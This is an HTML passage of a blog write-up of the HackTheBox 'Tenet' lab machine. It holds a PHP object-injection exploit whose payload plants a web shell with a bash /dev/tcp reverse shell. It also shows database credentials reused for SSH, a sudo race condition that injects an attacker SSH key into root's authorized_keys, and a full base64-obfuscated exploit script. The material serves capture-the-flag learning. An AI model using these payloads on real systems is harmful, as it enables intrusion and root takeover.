<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'poorduck.php'</span><span class="p">;</span>
    	<span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;tun0-IP&gt;/4141 0&gt;&amp;1\'"); ?&gt;'</span><span class="p">;</span>

<span class="p">}</span>

<span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://10.10.10.223/sator.php?arepo='</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">));</span>
<span class="k">echo</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
<span class="nv">$upload</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$url</span><span class="s2">"</span><span class="p">);</span>
<span class="nv">$exec</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"http://10.10.10.223/poorduck.php"</span><span class="p">);</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><ul><li><p>running the script gives us <code class="language-plaintext highlighter-rouge">www-data</code> user shell on natcat -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>  ❯ nc -nvlp 4141
  listening on [any] 4141 ...
  connect to [10.10.15.114] from (UNKNOWN) [10.10.10.223] 28858
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  www-data@tenet:/var/www/html$
</pre></table></code></div></div><li><p>from the wordpress config file we get the database creds -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>  www-data@tenet:/var/www/html$ ls
  ls
  hush.php    poorduck.php  sator.php.bak  users.txt
  index.html  sator.php     shell.php      wordpress
  www-data@tenet:/var/www/html$ cat -n wordpress/wp-config.php | sed -n '21,38p'
  &lt;l/wordpress$ cat -n wp-config.php | sed -n '21,38p'
  21  // ** MySQL settings - You can get this info from your web host ** //
  22  /** The name of the database for WordPress */
  23  define( 'DB_NAME', 'wordpress' );
  24
  25  /** MySQL database username */
  26  define( 'DB_USER', 'neil' );
  27
  28  /** MySQL database password */
  29  define( 'DB_PASSWORD', 'Opera2112' );
  30
  31  /** MySQL hostname */
  32  define( 'DB_HOST', 'localhost' );
  33
  34  /** Database Charset to use in creating database tables. */
  35  define( 'DB_CHARSET', 'utf8mb4' );
  36
  37  /** The Database Collate type. Don't change this if in doubt. */
  38  define( 'DB_COLLATE', '' );
</pre></table></code></div></div><li><p>i tried login to sql database but there is nothing only found 2 password hashes but they looks like not cracable -</p><p><code class="language-plaintext highlighter-rouge">mysql -u neil -pOpera2112</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.01 sec)

mysql&gt; use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| ... [snip] ...        |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql&gt; SELECT * FROM wp_users;
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login  | user_pass                          | user_nicename | user_email            | user_url                     | user_registered     | user_activation_key | user_status | display_name |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist   | protagonist@tenet.htb | http://10.10.10.44/wordpress | 2020-12-16 12:17:10 |                     |           0 | protagonist  |
|  2 | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil          | neil@tenet.htb        | http://tenet.htb             | 2020-12-16 14:51:26 |                     |           0 | neil neil    |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)
</pre></table></code></div></div><li><p>then i try to use database creds to reuse in ssh login and it worked and get the neil user shell -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ ssh neil@10.129.34.42
neil@10.129.34.42's password: Opera2112
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:~$ cat user.txt
6599558b************************
</pre></table></code></div></div></ul><h1 id="root-escalation">Root escalation</h1><ul><li>check the user’s sudo rights -</ul><p>neil@tenet:~$ sudo -l Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:</p><p>User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh</p><ul><li>user can run <code class="language-plaintext highlighter-rouge">/usr/local/bin/enableSSH.sh</code> file with sudo without password.<li><p>viewing the file -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
-rwxr-xr-x 1 root root 1080 Dec  8 13:46 /usr/local/bin/enableSSH.sh
</pre></table></code></div></div></ul><p><strong>Understanding the script code:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

checkAdded<span class="o">()</span> <span class="o">{</span>
        <span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                /bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
        <span class="k">else</span>
                /bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
        <span class="k">fi</span>
<span class="o">}</span>

checkFile<span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                /bin/echo <span class="s2">"Error in creating key file!"</span>
                <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi
                </span><span class="nb">exit </span>1
        <span class="k">fi</span>
<span class="o">}</span>

addKey<span class="o">()</span> <span class="o">{</span>
        <span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>         //create temperary file named ssh-&lt;8_rendom_chars&gt; like ssh-Yt45Pc8s,
        <span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>                    //mask file permission to <span class="nb">read </span>and write,
        /bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>                      //append <span class="nv">$key</span> variable value <span class="k">in </span>the <span class="nv">$tmpName</span> file,
        checkFile <span class="nv">$tmpName</span>                             //call the checkFile<span class="o">()</span> <span class="k">function </span>to verify that the file is created and <span class="nv">$key</span> is added,
        /bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys //now <span class="nb">cat </span>out the <span class="nv">$tmpName</span> file and append it to root ssh authorized_keys,
        /bin/rm <span class="nv">$tmpName</span>                               //and remove <span class="nv">$tmpName</span> file form tmp directory.
<span class="o">}</span>

<span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
addKey
checkAdded        //This <span class="k">function </span>execute after key added to authorized_keys to verify <span class="sb">`</span>/root/.ssh/authorized_keys<span class="sb">`</span> <span class="k">for</span> <span class="nv">$key</span><span class="nb">.</span>
</pre></table></code></div></div><p><a href="https://askubuntu.com/questions/44542/what-is-umask-and-how-does-it-work">what-is-umask-and-how-does-it-work</a></p><ul><li>ok, So everything is happening in the <code class="language-plaintext highlighter-rouge">addkey()</code> function. when <code class="language-plaintext highlighter-rouge">$tmpName</code> is created this script append his <code class="language-plaintext highlighter-rouge">$key</code> in that file and than add it into the root ssh authorized_keys.</ul><p><strong>Attack Surface:</strong></p><ul><li>the script first create tmp file and than add his key inside that file and if we add our key to that tmp file at same time when this script add his key our key also added to root ssh authorized_keys.<li><p>but script done all this work in less then a second and there is no way we can manually add our key to that tmp file for this we can create a loop which execute the script and echoing our ssh key at same time for N number of time -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>while true; do sudo /usr/local/bin/enableSSH.sh &amp; echo "&lt;public-ssh-key&gt;" | tee /tmp/ssh-* 1&gt;&amp;2 &amp; done
</pre></table></code></div></div><ul><li>i tried it multiple time and in 100 loop i get the success</ul></ul><p><strong>Getting Root shell:</strong></p><ul><li>create ssh key and add public key into the loop.<li><p>running the loop -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>while true; do sudo /usr/local/bin/enableSSH.sh &amp; echo "&lt;public-ssh-key&gt;" | tee /tmp/ssh-* 1&gt;&amp;2 &amp; done
</pre></table></code></div></div><li><p>use your private ssh key pair to login as root in the box -</p><p><code class="language-plaintext highlighter-rouge">ssh -i private_key root@10.10.10.223</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ ssh -i tenet root@10.129.34.42
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

root@tenet:~# id 
uid=0(root) gid=0(root) groups=0(root)
root@tenet:~# cat root.txt
1bec96c5************************
root@tenet:~# 
</pre></table></code></div></div></ul><p><strong>Exploit Script</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

sshpass <span class="nt">-p</span> Opera2112 ssh <span class="nt">-l</span> neil 10.10.10.223 <span class="s2">"rm /tmp/ssh*; base64 -d &lt;&lt;&lt; 'Zm9yIGkgaW4gJChzZXEgMTAwMCk7IGRvCiAgICBzdWRvIC91c3IvbG9jYWwvYmluL2VuYWJsZVNTSC5zaCAmCiAgICBlY2hvICJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJnUURmVWVRTDlFVm1JbjdBWTdJUlpuNzIydFdteUplRWFlRlNZa1BtUnB6U2Q4VzNTODlTZFllYVFQU1gwaUZaVjhLSE8vNUJ5Ly9OcVRCQzlNdHF6TnFLVnZNNE12YWl1ZnZLU3gxRUVITTdDQzM2bDdxYkJlYm5aL2JDTFJZVHFzZTdRSDYxVVlMN1lKWFJGYkJ3OG4rQkI0SWJHRjJxcEkxNmpSQk5kK0VMaEFUU3MyYTBRSVJhbzlURm96d0xnRDlRaFlwVzJ5dVdrR2k2alZQR3hCTk9RUi8xbTJHRFJjVTA5VTRka1VBSTk5UGVkS3pGa29KOFpWVVEyTW5hbW1qR000bDlaeWdVZDFhS1lpdFRNY2lpTy9tNUswYWl3bzRTNFlpbGtPQVE5Y0s4aXU3QlFyVjJDYThqcDlJVUZIdG5lM2lJRFpIVUtSRUNRbHd3TGRVRmZwNHBPcXRLbWpBTkRjWlJ2Wjk2dGtDT2tjSXBIaWpWcEV4YkVGdjlSUmY0MUtVUVhKZ1U2dlU0VytldERyTDBhZGJnQlN6MU16eFEvOVl0OXJudzVaOFJVbjNiS214ek5iNDhmQWdsWjdxY0JyeW0zMFFXNUNYMC9HSm1idGtnVHd0S3FldGhNMHdyMHI0cGg2RWh6SkFIVUFpM1VKK0w0eitSSGc2Z09Taz0iIHwgdGVlIC90bXAvc3NoLSogMT4mMiAmCmRvbmU=' | bash &gt; /dev/null 2&gt;&amp;1"</span> &amp;


<span class="k">while </span><span class="nb">true
</span><span class="k">do
	</span><span class="nv">rspn</span><span class="o">=</span><span class="si">$(</span>ssh <span class="nt">-o</span> <span class="nv">PasswordAuthentication</span><span class="o">=</span>no <span class="nt">-i</span> ./root_key root@10.10.10.223 <span class="s1">'id'</span> 2&gt;/dev/null<span class="si">)</span>
	<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$rspn</span><span class="s2">"</span> <span class="o">]</span>
	<span class="k">then
		continue
	else
		</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$rspn</span><span class="s2">"</span>
		<span class="nb">break
	</span><span class="k">fi
done</span>

<span class="c">#ssh -i ./root_key root@10.10.10.223 'hostname'</span>
ssh <span class="nt">-i</span> ./root_key root@10.10.10.223 <span class="s1">'flag=$(find / -type f \( -name "user.txt" -o -name "root.txt" \) -print 2&gt;/dev/null) &amp;&amp; cat $flag'</span>
</pre></table></code></div></div><h2 id="inotify"><span class="mr-2">inotify</span><a href="#inotify" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong><a href="https://man7.org/linux/man-pages/man7/inotify.7.html">inotify</a></strong> API provides a mechanism for monitoring filesystem events. Inotify can be used to monitor individual files, or to monitor directories. When a directory is monitored, inotify will return events for the directory itself, and for files inside the directory.</p><ul><li><a href="https://linuxhint.com/inotify_api_c_language/">inotify api example in c</a><li>ippsec explain in <a href="https://www.youtube.com/watch?v=LhdE7dXbTQw&amp;t=1560s">tenet video</a></ul><p>Compile C code</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc inotify.c <span class="nt">-o</span> inofifythis
</pre></table></code></div></div><p><img data-src="/assets/img/posts/tenet/inotify-poc.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/source-code-review/" class="post-tag no-text-decoration" >source code review</a> <a href="/tags/php-object-injection/" class="post-tag no-text-decoration" >php object injection</a> <a href="/tags/inotify/" class="post-tag no-text-decoration" >inotify</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Tenet - Poorduck&amp;url=https://x00tex.github.io/posts/tenet/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Tenet - Poorduck&amp;u=https://x00tex.github.io/posts/tenet/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/tenet/&amp;text=Hackthebox - Tenet - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/proper/"><div class="card-body"> <em class="timeago small" data-ts="1629570600" > 2021-08-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Proper</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.10.231 proper.htb nmap scan: 1 2 3 4 5 6 7 PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky met...</p></div></div></a></div><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/pikaboo/"><div class="card-body"> <em class="timeago small" data-ts="1639161000" > 2021-12-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Pikaboo</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.10.249 pikaboo.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 1...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/delivery/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Delivery</p></a> <a href="/posts/ophiuchi/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Ophiuchi</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
